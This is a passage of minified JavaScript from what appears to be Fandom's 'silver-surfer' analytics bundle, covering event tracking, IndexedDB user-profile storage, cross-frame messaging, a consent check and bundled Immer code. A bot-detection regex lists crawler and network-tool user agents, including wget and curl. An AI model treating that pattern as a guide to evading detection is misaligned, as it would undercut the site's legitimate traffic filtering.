T(){N()&&(window.__datalayer_pre=window.__datalayer_pre||[],window.__datalayer_pre.length>0&&(window.__datalayer_pre_interval_id&&window.clearInterval(window.__datalayer_pre_interval_id),window.__datalayer_pre.forEach((t=>window.dataLayer.push(t))),window.__datalayer_pre=[]),window.__datalayer_pre_interval_id&&(window.clearInterval(window.__datalayer_pre_interval_id),window.__datalayer_pre_interval_id=null))}function L(t){if(t.isDebug=!!t.isDebug,t.event){if(window.dataLayer=window.dataLayer||[],t.category||(t.category=t.event),t.label||(t.label=t.category),t.isDebug){e=t.event,k.some((t=>e.includes(t)))||console.warn("[Tracking] GTM event not caught",t.event);const n=R;Object.keys(t).every((e=>!(!n.includes(e)&&!t.skipValidation&&(console.warn("[Tracking] Element not enabled in DW",e),1))))}return function(t){return window.__datalayer_pre=window.__datalayer_pre||[],N()?(T(),window.dataLayer.push(t)):window.__datalayer_pre.push(t)}(t)}var e;return console.error("[Tracking] missing 'event' field",t),null}function B(){return!!window.location.search.includes("ss_debug")||M()}window.__datalayer_pre_interval_id||N()||(window.__datalayer_pre_interval_id=window.setInterval(T,500));const M=()=>/^localhost/.test(location.hostname)||"127.0.0.1"===location.hostname;function U(t,e){const n=n=>{const r=Object.assign(Object.assign({nonInteractive:!0},t),n);return e(r),r};return n.click=e=>n(Object.assign(Object.assign(Object.assign({},t),e),{action:"click",nonInteractive:!1})),n.impression=e=>n(Object.assign(Object.assign(Object.assign({},t),e),{action:"impression",nonInteractive:!0})),n.hover=e=>n(Object.assign(Object.assign(Object.assign({},t),e),{action:"hover",nonInteractive:!0})),n.loaded=e=>n(Object.assign(Object.assign(Object.assign({},t),e),{action:"loaded",nonInteractive:!0})),n.extend=n=>U(Object.assign(Object.assign({},t),n),e),n}function F(t,e){const n=Object.assign({},t);if(!n.event&&!n.category)throw console.error("[Tracking] Missing event or category field",n),new Error("Missing event or category field");return n.category||(n.category=n.event),n.event||(n.event=n.category),U(n,e)}function z(t){return F(t,L)}function V(t){return`${B()?"dev-":""}${t}`}F({category:"base-tracker"},L);const $="__frontend_utils_consistent_random";function H(){return window[$]||(window[$]=Math.random()),window[$]}const W=z({event:"browser-client-timings"});let G=new Map;function K(t){try{const e=Math.round(Date.now()-function(){if(!window.performance&&!window.performance.timeOrigin)throw new Error("Performance value not set");return window.performance.timeOrigin}());return function(t,e){var n,r;G.set(t,e),n=t,r=e,(B()||H()<=.005)&&W({category:`timings-event-${n}`,label:r.toString(),action:"timed",value:r})}(t,e),B()&&console.log("Timing",t,e),e}catch(t){console.error("TimingRecord Error",t)}}function q(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(null!=t&&"function"==typeof Object.getOwnPropertySymbols){var o=0;for(r=Object.getOwnPropertySymbols(t);o<r.length;o++)e.indexOf(r[o])<0&&Object.prototype.propertyIsEnumerable.call(t,r[o])&&(n[r[o]]=t[r[o]])}return n}function J(t,e,n,r){return new(n||(n=Promise))((function(o,i){function a(t){try{c(r.next(t))}catch(t){i(t)}}function s(t){try{c(r.throw(t))}catch(t){i(t)}}function c(t){var e;t.done?o(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(a,s)}c((r=r.apply(t,e||[])).next())}))}Object.create,Object.create;var Y=n(9579),X=n.n(Y),Q=n(7557),Z=n.n(Q);const tt={profileId:null,namespaces:{adTags:{},devices:{set:[]},locations:{set:[]},languages:{contentLanguages:[],acceptLanguages:[]}}},et="silver_surfer_tracking_key_v2",nt="silver_surfer_actions_v2",rt="silver_surfer_interactions_v2",ot=t=>`silver-surfer-galactus-fallback-user-profile-v2_${t}`;function it(){return J(this,void 0,void 0,(function*(){const t=localStorage.getItem(rt);return t?JSON.parse(t):{}}))}function at(){return J(this,void 0,void 0,(function*(){const t=localStorage.getItem(et);return t?JSON.parse(t):[]}))}function st(){return J(this,void 0,void 0,(function*(){const t=localStorage.getItem(nt);return t?JSON.parse(t):[]}))}let ct,ut;const lt=new WeakMap,dt=new WeakMap,ft=new WeakMap,pt=new WeakMap,vt=new WeakMap;let gt={get(t,e,n){if(t instanceof IDBTransaction){if("done"===e)return dt.get(t);if("objectStoreNames"===e)return t.objectStoreNames||ft.get(t);if("store"===e)return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return ht(t[e])},set:(t,e,n)=>(t[e]=n,!0),has:(t,e)=>t instanceof IDBTransaction&&("done"===e||"store"===e)||e in t};function ht(t){if(t instanceof IDBRequest)return function(t){const e=new Promise(((e,n)=>{const r=()=>{t.removeEventListener("success",o),t.removeEventListener("error",i)},o=()=>{e(ht(t.result)),r()},i=()=>{n(t.error),r()};t.addEventListener("success",o),t.addEventListener("error",i)}));return e.then((e=>{e instanceof IDBCursor&&lt.set(e,t)})).catch((()=>{})),vt.set(e,t),e}(t);if(pt.has(t))return pt.get(t);const e=function(t){return"function"==typeof t?(e=t)!==IDBDatabase.prototype.transaction||"objectStoreNames"in IDBTransaction.prototype?(ut||(ut=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])).includes(e)?function(...t){return e.apply(yt(this),t),ht(lt.get(this))}:function(...t){return ht(e.apply(yt(this),t))}:function(t,...n){const r=e.call(yt(this),t,...n);return ft.set(r,t.sort?t.sort():[t]),ht(r)}:(t instanceof IDBTransaction&&function(t){if(dt.has(t))return;const e=new Promise(((e,n)=>{const r=()=>{t.removeEventListener("complete",o),t.removeEventListener("error",i),t.removeEventListener("abort",i)},o=()=>{e(),r()},i=()=>{n(t.error||new DOMException("AbortError","AbortError")),r()};t.addEventListener("complete",o),t.addEventListener("error",i),t.addEventListener("abort",i)}));dt.set(t,e)}(t),((t,e)=>e.some((e=>t instanceof e)))(t,ct||(ct=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction]))?new Proxy(t,gt):t);var e}(t);return e!==t&&(pt.set(t,e),vt.set(e,t)),e}const yt=t=>vt.get(t),bt=["get","getKey","getAll","getAllKeys","count"],mt=["put","add","delete","clear"],wt=new Map;function St(t,e){if(!(t instanceof IDBDatabase)||e in t||"string"!=typeof e)return;if(wt.get(e))return wt.get(e);const n=e.replace(/FromIndex$/,""),r=e!==n,o=mt.includes(n);if(!(n in(r?IDBIndex:IDBObjectStore).prototype)||!o&&!bt.includes(n))return;const i=async function(t,...e){const i=this.transaction(t,o?"readwrite":"readonly");let a=i.store;return r&&(a=a.index(e.shift())),(await Promise.all([a[n](...e),o&&i.done]))[0]};return wt.set(e,i),i}var Ot;function _t(){return"undefined"!=typeof window&&window.location&&window.location.hostname&&window.location.hostname.includes("fandom.com")?"https://services.fandom.com/":"https://services.fandom-dev."+(location.hostname.match(/(?!\.)(pl|us)$/)||["us"])[0]+"/"}Ot=gt,gt={...Ot,get:(t,e,n)=>St(t,e)||Ot.get(t,e,n),has:(t,e)=>!!St(t,e)||Ot.has(t,e)};const Et={DEBUG:"ss_debug",BRANCH:"ss_branch_deploy",CANARY:"ss_canary",ENABLED_PATHFINDER_MODULE:"ss_pathfinder_enable",FORCED_PATHFINDER:"ss_pathfinder_forced",FORCED_BUCKETING:"ss_pathfinder_force_bucket"},It=M,xt="39f1a7346\n".replace(/\n/g,"")||"local",At=t=>window.location.search.includes(t),jt=()=>At(`${Et.DEBUG}=true`);function Dt(){}const kt=Date.now(),Pt=(t,e,n=[])=>(r,...o)=>((t,e,n,r,...o)=>{const i=function(t){return"error"===t?console.error:"debug"===t?jt()||It()?console.debug:Dt:console.log}(t),a=`%c${e} | ${function(){var t,e;return((Date.now()-(null!==(e=null===(t=window.performance)||void 0===t?void 0:t.timeOrigin)&&void 0!==e?e:kt))/1e3).toFixed(4)}()}s | ${r}`;o.length?i(a,n,...o):i(a,n)})(e,t,n.join(";"),r,...o);function Ct(t){return["background-color: silver;","padding: 2px 4px","border-radius: 2px",`color: ${t}`]}const Rt={info:Pt("SilverSurfer","info",Ct("#000")),debug:Pt("SilverSurfer","debug",Ct("#330")),error:Pt("SilverSurfer","error",Ct("#300"))},Nt=z({event:"browser-client-metric"}),Tt=H();function Lt(t,e,n,r){try{return n<Tt&&!B()?null:Nt({category:V(`browser-client-metric-${t}`),label:r,value:null!=e?e:t,action:"metric"})}catch(t){return null}}const Bt="page-view-table",Mt="actions-table",Ut="interactions-table",Ft="current",zt="galactus-fallback-user-profile-table",Vt="active-data-table";let $t=!1;function Ht(){return J(this,void 0,void 0,(function*(){if(!$t)try{return yield function(t,e,{blocked:n,upgrade:r,blocking:o,terminated:i}={}){const a=indexedDB.open(t,e),s=ht(a);return r&&a.addEventListener("upgradeneeded",(t=>{r(ht(a.result),t.oldVersion,t.newVersion,ht(a.transaction))})),n&&a.addEventListener("blocked",(()=>n())),s.then((t=>{i&&t.addEventListener("close",(()=>i())),o&&t.addEventListener("versionchange",(()=>o()))})).catch((()=>{})),s}("silver-surfer",6,{upgrade(t,e,n,r){t.objectStoreNames.contains(Bt)||t.createObjectStore(Bt),t.objectStoreNames.contains(zt)||t.createObjectStore(zt),t.objectStoreNames.contains(Mt)||t.createObjectStore(Mt,{autoIncrement:!0}),t.objectStoreNames.contains(Ut)||t.createObjectStore(Ut),t.objectStoreNames.contains(Vt)||t.createObjectStore(Vt)},blocked(){},blocking(){},terminated(){}})}catch(t){Rt.error("Cannot access indexedDB:",t),Lt("cannot-access-indexeddb",1,1),$t=!0}}))}const Wt=t=>`user-profile-${t}`;var Gt;!function(t){t.IndexedDB="indexeddb",t.LocalStorage="localstorage"}(Gt||(Gt={}));const Kt={[Gt.IndexedDB]:200,[Gt.LocalStorage]:100},qt={[Gt.IndexedDB]:500,[Gt.LocalStorage]:200};function Jt(){try{return!!(null===window||void 0===window?void 0:window.localStorage)}catch(t){return!1}}function Yt(){try{return!!(null===window||void 0===window?void 0:window.indexedDB)}catch(t){return!1}}function Xt(t,e,n,r={}){console.error("logErrorEvent",{client:t,clientVersion:e,name:n,data:r})}Math.max(qt[Gt.LocalStorage],Kt[Gt.LocalStorage]);const Qt=(t,e)=>(n,r={})=>Xt(t,e,n,r),Zt=(t,e)=>(n,r)=>Xt(t,e,n,(({ok:t,redirected:e,status:n,statusText:r,type:o,url:i})=>({ok:t,redirected:e,status:n,statusText:r,type:o,url:i}))(r));Qt("silver-surfer",xt);const te=Zt("silver-surfer",xt);function ee(t,e,n){return void 0===n&&(n={}),fetch(e,n).then((n=>("opaque"===n.type||n.ok||401===n.status||404===n.status||("function"==typeof t?t(e,n):console.error("fetchWithLogging Error",{url:e,response:n})),n)))}const ne=t=>(e,n={})=>ee(t,_t()+e,Object.assign({mode:"cors",credentials:"include"},n)),re=t=>(e,n,r={})=>ee(t,_t()+e,Object.assign({method:"POST",headers:{"Content-Type":"application/json"},mode:"cors",credentials:"include",body:JSON.stringify(n)},r)),oe=ne(te);re(te);var ie=n(9996),ae=n.n(ie),se=function(){return(se=Object.assign||function(t){for(var e,n=1,r=arguments.length;n<r;n++)for(var o in e=arguments[n])Object.prototype.hasOwnProperty.call(e,o)&&(t[o]=e[o]);return t}).apply(this,arguments)},ce={channelId:"default",host:window,coordinatorHost:window.top},ue={connect:"connect",connected:"connected"},le="@wikia/post-quecast";function de(t){return t.channelId&&t.libId===le&&t.action&&function(t){return"string"==typeof t.type&&"number"==typeof t.timestamp}(t.action)}function fe(t){return!t.data.private}function pe(t,e){return t.data.channelId===e}function ve(t){return t.data.action}var ge=function(){function t(){}return t.make=function(t){return function(t){var e;return t.host===t.coordinatorHost&&!!(null===(e=t.coordinatorHost[le])||void 0===e?void 0:e.callbackConnector)}(t)?t.coordinatorHost[le].callbackConnector:new ye({senderHost:t.coordinatorHost,listenerHost:t.host})},t}(),he=function(){function t(t){this.coordinatorHost=t,this.callbacks=[]}return t.prototype.dispatch=function(t){var e=this;if(!de(t))throw new Error("Incorrect object type. Expected PostMessageData, but got "+t);this.callbacks.forEach((function(n){return n({data:t,source:e.coordinatorHost})}))},t.prototype.addListener=function(t){this.callbacks.push(t)},t.prototype.removeListener=function(t){this.callbacks=this.callbacks.filter((function(e){return e!==t}))},t}(),ye=function(){function t(t){this.options=t,this.map=new Map}return t.prototype.dispatch=function(t){if(!de(t))throw new Error("Incorrect object type. Expected PostMessageData, but got "+t);this.options.senderHost.postMessage(t,"*")},t.prototype.addListener=function(t){var e=function(e){var n;(n=e)&&n.source&&n.data&&de(n.data)&&t(e)};this.map.set(t,e),this.options.listenerHost.addEventListener("message",e)},t.prototype.removeListener=function(t){var e=this.map.get(t);this.options.listenerHost.removeEventListener("message",e),this.map.delete(t)},t}(),be=function(){function t(t){this.callbacks=[],this.history=[],this.channelId=t.channelId,this.connector=ge.make(t),this.setupActions(),this.setupConnection()}return t.prototype.setupActions=function(){this.getHistory(),this.listenEvent()},t.prototype.getHistory=function(){var t=this,e=function(n){if(pe(n,t.channelId)&&function(t){return!!t.data.private}(n)){var r=ve(n);(function(t){for(var e=[],n=1;n<arguments.length;n++)e[n-1]=arguments[n];return e.some((function(e){return t.type===e}))})(r,ue.connected)&&(t.connector.removeListener(e),t.handleActions.apply(t,r.history))}};this.connector.addListener(e)},t.prototype.listenEvent=function(){var t=this;this.connector.addListener((function(e){if(pe(e,t.channelId)&&fe(e)){var n=ve(e);t.handleActions(n)}}))},t.prototype.handleActions=function(){for(var t,e=this,n=[],r=0;r<arguments.length;r++)n[r]=arguments[r];(t=this.history).push.apply(t,n),n.forEach((function(t){return e.callbacks.forEach((function(e){return e(t)}))}))},t.prototype.setupConnection=function(){this.connector.dispatch({action:{type:ue.connect,timestamp:Date.now()},channelId:this.channelId,private:!0,libId:le})},t.prototype.addListener=function(t){this.history.forEach((function(e){return t(e)})),this.callbacks.push(t)},t.prototype.removeListener=function(t){this.callbacks=this.callbacks.filter((function(e){return e!==t}))},t}(),me=function(){function t(t){void 0===t&&(t={});var e=se(se({},ce),t);this.channelId=e.channelId,this.connector=ge.make(e)}return t.prototype.dispatch=function(t){this.connector.dispatch({action:se(se({},t),{timestamp:Date.now()}),channelId:this.channelId,private:!0,libId:le})},t}(),we=function(){function t(t){void 0===t&&(t={});var e=se(se({},ce),t);this.transmitter=new me(e),this.receiver=new be(e)}return t.prototype.dispatch=function(t){this.transmitter.dispatch(t)},t.prototype.addListener=function(t){this.receiver.addListener(t)},t.prototype.removeListener=function(t){this.receiver.removeListener(t)},t}(),Se=function(){function t(t,e){this.channelId=t,this.connectors=new Map,this.history=[],this.connectors.set(e,e[le].callbackConnector)}return t.prototype.addConnection=function(t){this.ensureConnector(t).dispatch({action:this.createConnectedAction(),private:!0,channelId:this.channelId,libId:le})},t.prototype.createConnectedAction=function(){return{type:ue.connected,history:this.history,timestamp:Date.now()}},t.prototype.broadcast=function(t){var e=this;this.history.push(t),this.connectors.forEach((function(n){n.dispatch({action:t,channelId:e.channelId,libId:le})}))},t.prototype.ensureConnector=function(t){return this.connectors.has(t)||this.connectors.set(t,new ye({senderHost:t,listenerHost:t})),this.connectors.get(t)},t}(),Oe=function(){function t(t){this.coordinatorHost=t,this.channels=new Map,this.callbackConnector=new he(t),this.postMessageConnector=new ye({senderHost:t,listenerHost:t})}return t.prototype.init=function(){var t=this,e=function(e){fe(e)||(t.handleConnect(e),t.handleBroadcast(e))};this.callbackConnector.addListener(e),this.postMessageConnector.addListener(e)},t.prototype.handleConnect=function(t){(function(t){for(var e=[],n=1;n<arguments.length;n++)e[n-1]=arguments[n];return e.some((function(e){return t.data.action.type===e}))})(t,ue.connect)&&this.ensureChannel(t.data.channelId).addConnection(t.source)},t.prototype.handleBroadcast=function(t){(function(t){return!Object.values(ue).some((function(e){return t.data.action.type===e}))})(t)&&this.ensureChannel(t.data.channelId).broadcast(t.data.action)},t.prototype.ensureChannel=function(t){return this.channels.has(t)||this.channels.set(t,new Se(t,this.coordinatorHost)),this.channels.get(t)},t}();class _e{constructor(){this.history=new Map,function(t){if(void 0===t&&(t=window),!t[le]){var e=new Oe(t);e.init(),t[le]=e}}(),this.communicator=new we}dispatch(t){this.communicator.dispatch(Object.assign(Object.assign({},t),{__global:!0}))}on(t,e){this.communicator.addListener((n=>this.run(n,t,e)))}once(t,e){this.communicator.addListener((n=>this.runOnce(n,t,e)))}run(t,e,n){this.ofType(t,e)&&n(t)}runOnce(t,e,n){if(this.ofType(t,e)){if(this.history.has(e))return n(t);this.history.set(e,!0),n(t)}}ofType(t,e){return t.type===e}}let Ee=null;function Ie(){return null===Ee&&(Ee=new _e),Ee}const xe=function(){return J(this,void 0,void 0,(function*(){if("boolean"==typeof(null===window||void 0===window?void 0:window.__f_optin))return Promise.resolve(window.__f_optin);const t=Ie();return new Promise(((e,n)=>{t.once("[AdEngine OptIn] set opt in",(({geoRequiresConsent:t,geoRequiresSignal:r,gdprConsent:o,ccpaSignal:i})=>{t&&o||r&&!i||!r&&!t?e(!0):n(!1)}))}))}))};function Ae(t){const e=new RegExp("(googlebot/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)","i"),n="string"==typeof t?t:null===navigator||void 0===navigator?void 0:navigator.userAgent;return e.test(n)}function je(t){for(var e=arguments.length,n=Array(e>1?e-1:0),r=1;r<e;r++)n[r-1]=arguments[r];throw Error("[Immer] minified error nr: "+t+(n.length?" "+n.map((function(t){return"'"+t+"'"})).join(","):"")+". Find the full error at: https://bit.ly/3cXEKWf")}function De(t){return!!t&&!!t[hn]}function ke(t){return!!t&&(function(t){if(!t||"object"!=typeof t)return!1;var e=Object.getPrototypeOf(t);if(null===e)return!0;var n=Object.hasOwnProperty.call(e,"constructor")&&e.constructor;return n===Object||"function"==typeof n&&Function.toString.call(n)===yn}(t)||Array.isArray(t)||!!t[gn]||!!t.constructor[gn]||Be(t)||Me(t))}function Pe(t){return De(t)||je(23,t),t[hn].t}function Ce(t,e,n){void 0===n&&(n=!1),0===Re(t)?(n?Object.keys:bn)(t).forEach((function(r){n&&"symbol"==typeof r||e(r,t[r],t)})):t.forEach((function(n,r){return e(r,n,t)}))}function Re(t){var e=t[hn];return e?e.i>3?e.i-4:e.i:Array.isArray(t)?1:Be(t)?2:Me(t)?3:0}function Ne(t,e){return 2===Re(t)?t.has(e):Object.prototype.hasOwnProperty.call(t,e)}function Te(t,e,n){var r=Re(t);2===r?t.set(e,n):3===r?(t.delete(e),t.add(n)):t[e]=n}function Le(t,e){return t===e?0!==t||1/t==1/e:t!=t&&e!=e}function Be(t){return dn&&t instanceof Map}function Me(t){return fn&&t instanceof Set}function Ue(t){return t.o||t.t}function Fe(t){if(Array.isArray(t))return Array.prototype.slice.call(t);var e=mn(t);delete e[hn];for(var n=bn(e),r=0;r<n.length;r++){var o=n[r],i=e[o];!1===i.writable&&(i.writable=!0,i.configurable=!0),(i.get||i.set)&&(e[o]={configurable:!0,writable:!0,enumerable:i.enumerable,value:t[o]})}return Object.create(Object.getPrototypeOf(t),e)}function ze(t,e){return void 0===e&&(e=!1),$e(t)||De(t)||!ke(t)||(Re(t)>1&&(t.set=t.add=t.clear=t.delete=Ve),Object.freeze(t),e&&Ce(t,(function(t,e){return ze(e,!0)}),!0)),t}function Ve(){je(2)}function $e(t){return null==t||"object"!=typeof t||Object.isFrozen(t)}function He(t){var e=wn[t];return e||je(18,t),e}function We(){return un}function Ge(t,e){e&&(He("Patches"),t.u=[],t.s=[],t.v=e)}function Ke(t){qe(t),t.p.forEach(Ye),t.p=null}function qe(t){t===un&&(un=t.l)}function Je(t){return un={p:[],l:un,h:t,m:!0,_:0}}function Ye(t){var e=t[hn];0===e.i||1===e.i?e.j():e.O=!0}function Xe(t,e){e._=e.p.length;var n=e.p[0],r=void 0!==t&&t!==n;return e.h.g||He("ES5").S(e,t,r),r?(n[hn].P&&(Ke(e),je(4)),ke(t)&&(t=Qe(e,t),e.l||tn(e,t)),e.u&&He("Patches").M(n[hn].t,t,e.u,e.s)):t=Qe(e,n,[]),Ke(e),e.u&&e.v(e.u,e.s),t!==vn?t:void 0}function Qe(t,e,n){if($e(e))return e;var r=e[hn];if(!r)return Ce(e,(function(o,i){return Ze(t,r,e,o,i,n)}),!0),e;if(r.A!==t)return e;if(!r.P)return tn(t,r.t,!0),r.t;if(!r.I){r.I=!0,r.A._--;var o=4===r.i||5===r.i?r.o=Fe(r.k):r.o;Ce(3===r.i?new Set(o):o,(function(e,i){return Ze(t,r,o,e,i,n)})),tn(t,o,!1),n&&t.u&&He("Patches").R(r,n,t.u,t.s)}return r.o}function Ze(t,e,n,r,o,i){if(De(o)){var a=Qe(t,o,i&&e&&3!==e.i&&!Ne(e.D,r)?i.concat(r):void 0);if(Te(n,r,a),!De(a))return;t.m=!1}if(ke(o)&&!$e(o)){if(!t.h.F&&t._<1)return;Qe(t,o),e&&e.A.l||tn(t,o)}}function tn(t,e,n){void 0===n&&(n=!1),t.h.F&&t.m&&ze(e,n)}function en(t,e){var n=t[hn];return(n?Ue(n):t)[e]}function nn(t,e){if(e in t)for(var n=Object.getPrototypeOf(t);n;){var r=Object.getOwnPropertyDescriptor(n,e);if(r)return r;n=Object.getPrototypeOf(n)}}function rn(t){t.P||(t.P=!0,t.l&&rn(t.l))}function on(t){t.o||(t.o=Fe(t.t))}function an(t,e,n){var r=Be(e)?He("MapSet").N(e,n):Me(e)?He("MapSet").T(e,n):t.g?function(t,e){var n=Array.isArray(t),r={i:n?1:0,A:e?e.A:We(),P:!1,I:!1,D:{},l:e,t:t,k:null,o:null,j:null,C:!1},o=r,i=Sn;n&&(o=[r],i=On);var a=Proxy.revocable(o,i),s=a.revoke,c=a.proxy;return r.k=c,r.j=s,c}(e,n):He("ES5").J(e,n);return(n?n.A:We()).p.push(r),r}function sn(t,e){switch(e){case 2:return new Map(t);case 3:return Array.from(t)}return Fe(t)}var cn,un,ln="undefined"!=typeof Symbol&&"symbol"==typeof Symbol("x"),dn="undefined"!=typeof Map,fn="undefined"!=typeof Set,pn="undefined"!=typeof Proxy&&void 0!==Proxy.revocable&&"undefined"!=typeof Reflect,vn=ln?Symbol.for("immer-nothing"):((cn={})["immer-nothing"]=!0,cn),gn=ln?Symbol.for("immer-draftable"):"__$immer_draftable",hn=ln?Symbol.for("immer-state"):"__$immer_state",yn=("undefined"!=typeof Symbol&&Symbol.iterator,""+Object.prototype.constructor),bn="undefined"!=typeof Reflect&&Reflect.ownKeys?Reflect.ownKeys:void 0!==Object.getOwnPropertySymbols?function(t){return Object.getOwnPropertyNames(t).concat(Object.getOwnPropertySymbols(t))}:Object.getOwnPropertyNames,mn=Object.getOwnPropertyDescriptors||function(t){var e={};return bn(t).forEach((function(n){e[n]=Object.getOwnPropertyDescriptor(t,n)})),e},wn={},Sn={get:function(t,e){if(e===hn)return t;var n=Ue(t);if(!Ne(n,e))return function(t,e,n){var r,o=nn(e,n);return o?"value"in o?o.value:null===(r=o.get)||void 0===r?void 0:r.call(t.k):void 0}(t,n,e);var r=n[e];return t.I||!ke(r)?r:r===en(t.t,e)?(on(t),t.o[e]=an(t.A.h,r,t)):r},has:function(t,e){return e in Ue(t)},ownKeys:function(t){return Reflect.ownKeys(Ue(t))},set:function(t,e,n){var r=nn(Ue(t),e);if(null==r?void 0:r.set)return r.set.call(t.k,n),!0;if(!t.P){var o=en(Ue(t),e),i=null==o?void 0:o[hn];if(i&&i.t===n)return t.o[e]=n,t.D[e]=!1,!0;if(Le(n,o)&&(void 0!==n||Ne(t.t,e)))return!0;on(t),rn(t)}return t.o[e]===n&&"number"!=typeof n&&(void 0!==n||e in t.o)||(t.o[e]=n,t.D[e]=!0,!0)},deleteProperty:function(t,e){return void 0!==en(t.t,e)||e in t.t?(t.D[e]=!1,on(t),rn(t)):delete t.D[e],t.o&&delete t.o[e],!0},getOwnPropertyDescriptor:function(t,e){var n=Ue(t),r=Reflect.getOwnPropertyDescriptor(n,e);return r?{writable:!0,configurable:1!==t.i||"length"!==e,enumerable:r.enumerable,value:n[e]}:r},defineProperty:function(){je(11)},getPrototypeOf:function(t){return Object.getPrototypeOf(t.t)},setPrototypeOf:function(){je(12)}},On={};Ce(Sn,(function(t,e){On[t]=function(){return arguments[0]=arguments[0][0],e.apply(this,arguments)}})),On.deleteProperty=function(t,e){return On.set.call(this,t,e,void 0)},On.set=function(t,e,n){return Sn.set.call(this,t[0],e,n,t[0])};var _n=new(function(){function t(t){var e=this;this.g=pn,this.F=!0,this.produce=function(t,n,r){if("function"==typeof t&&"function"!=typeof n){var o=n;n=t;var i=e;return function(t){var e=this;void 0===t&&(t=o);for(var r=arguments.length,a=Array(r>1?r-1:0),s=1;s<r;s++)a[s-1]=arguments[s];return i.produce(t,(function(t){var r;return(r=n).call.apply(r,[e,t].concat(a))}))}}var a;if("function"!=typeof n&&je(6),void 0!==r&&"function"!=typeof r&&je(7),ke(t)){var s=Je(e),c=an(e,t,void 0),u=!0;try{a=n(c),u=!1}finally{u?Ke(s):qe(s)}return"undefined"!=typeof Promise&&a instanceof Promise?a.then((function(t){return Ge(s,r),Xe(t,s)}),(function(t){throw Ke(s),t})):(Ge(s,r),Xe(a,s))}if(!t||"object"!=typeof t){if(void 0===(a=n(t))&&(a=t),a===vn&&(a=void 0),e.F&&ze(a,!0),r){var l=[],d=[];He("Patches").M(t,a,l,d),r(l,d)}return a}je(21,t)},this.produceWithPatches=function(t,n){if("function"==typeof t)return function(n){for(var r=arguments.length,o=Array(r>1?r-1:0),i=1;i<r;i++)o[i-1]=arguments[i];return e.produceWithPatches(n,(function(e){return t.apply(void 0,[e].concat(o))}))};var r,o,i=e.produce(t,n,(function(t,e){r=t,o=e}));return"undefined"!=typeof Promise&&i instanceof Promise?i.then((function(t){return[t,r,o]})):[i,r,o]},"boolean"==typeof(null==t?void 0:t.useProxies)&&this.setUseProxies(t.useProxies),"boolean"==typeof(null==t?void 0:t.autoFreeze)&&this.setAutoFreeze(t.autoFreeze)}var e=t.prototype;return e.createDraft=function(t){ke(t)||je(8),De(t)&&(t=function(t){return De(t)||je(22,t),function t(e){if(!ke(e))return e;var n,r=e[hn],o=Re(e);if(r){if(!r.P&&(r.i<4||!He("ES5").K(r)))return r.t;r.I=!0,n=sn(e,o),r.I=!1}else n=sn(e,o);return Ce(n,(function(e,o){r&&function(t,e){return 2===Re(t)?t.get(e):t[e]}(r.t,e)===o||Te(n,e,t(o))})),3===o?new Set(n):n}(t)}(t));var e=Je(this),n=an(this,t,void 0);return n[hn].C=!0,qe(e),n},e.finishDraft=function(t,e){var n=(t&&t[hn]).A;return Ge(n,e),Xe(void 0,n)},e.setAutoFreeze=function(t){this.F=t},e.setUseProxies=function(t){t&&!pn&&je(20),this.g=t},e.applyPatches=function(t,e){var n;for(n=e.length-1;n>=0;n--){var r=e[n];if(0===r.path.length&&"replace"===r.op){t=r.value;break}}n>-1&&(e=e.slice(n+1));var o=He("Patches").$;return De(t)?o(t,e):this.produce(t,(function(t){return o(t,e)}))},t}()),En=_n.produce;_n.produceWithPatches.bind(_n),_n.setAutoFreeze.bind(_n),_n.setUseProxies.bind(_n),_n.applyPatches.bind(_n),_n.createDraft.bind(_n),_n.finishDraft.bind(_n);const In=En;function xn(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function An(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)}return n}function jn(t){for(var e=1;e<arguments.length;e++){var 